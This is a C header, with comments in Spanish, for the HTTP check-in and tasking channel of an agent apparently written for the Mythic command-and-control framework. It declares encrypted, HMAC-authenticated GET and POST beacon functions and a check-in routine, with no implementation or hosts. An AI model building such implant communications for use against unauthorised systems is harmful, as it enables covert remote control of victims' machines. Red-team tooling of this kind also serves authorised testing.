#ifndef SPHINX_COMMS_H
#define SPHINX_COMMS_H
#include <stdint.h>
#include <windows.h>

/* GET: envia el uuid en el query param (GET_QUERY_NAME) y parsea la respuesta
   base64(uuid + IV||CT||HMAC) → TLV descifrado en recv_buf */
int http_get(_In_ const wchar_t* host, _In_ uint16_t port, _In_ const wchar_t* path,
             _In_ const char* uuid,
             _Out_ uint8_t* recv_buf, _In_ size_t max_len, _Out_ size_t* recv_len);

/* POST: body = base64(uuid + IV||CT||HMAC). Respuesta parseada igual que GET */
int http_post(_In_ const wchar_t* host, _In_ uint16_t port, _In_ const wchar_t* path,
              _In_ const char* uuid,
              _In_ const uint8_t* send_buf, _In_ size_t send_len,
              _Out_ uint8_t* recv_buf, _In_ size_t max_len, _Out_ size_t* recv_len);

/* Checkin completo: pack_checkin + POST + parse de la respuesta.
   uuid_out recibe el callback UUID real asignado por Mythic. */
int do_checkin(_Out_ char* uuid_out);

#endif //SPHINX_COMMS_H
